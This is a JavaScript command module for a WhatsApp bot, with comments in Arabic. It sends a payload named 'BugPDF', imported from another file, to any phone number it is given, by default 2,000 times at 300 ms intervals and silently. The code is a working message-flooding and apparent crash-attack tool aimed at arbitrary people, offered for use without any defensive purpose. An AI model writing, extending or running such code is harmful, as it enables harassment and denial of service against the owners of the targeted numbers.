const { bugpdf } = require('../bugpdf');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("bug")) return;

  const parts = text.trim().split(/\s+/);
  const command = parts[0];         // bug
  let number, count = 2000, silent = true;

  // الصيغ المقبولة:
  // bug 966xxxxxxxx
  // bug 966xxxxxxxx 10
  // bug confirm 966xxxxxxxx
  // bug confirm 966xxxxxxxx 50

  if (parts[1] === "confirm") {
    silent = false;
    number = parts[2];
    if (parts[3] && !isNaN(parts[3])) count = parseInt(parts[3]);
  } else {
    number = parts[1];
    if (parts[2] && !isNaN(parts[2])) count = parseInt(parts[2]);
  }

  if (!number || isNaN(number)) {
    return reply("❌ يرجى إدخال رقم صالح.\n\nمثال:\n- bug 9665xxxx\n- bug 9665xxxx 50\n- bug confirm 9665xxxx 20");
  }

  const jid = `${number}@s.whatsapp.net`;

  try {
    for (let i = 0; i < count; i++) {
      await sock.sendMessage(jid, { text: bugpdf });
      await new Promise(resolve => setTimeout(resolve, 300)); // تأخير 300ms
    }

    if (!silent) {
      await reply(`✅ تم إرسال BugPDF إلى ${number} عدد (${count}) مرة`);
    }

  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في الإرسال إلى: ${number}`);
  }
};
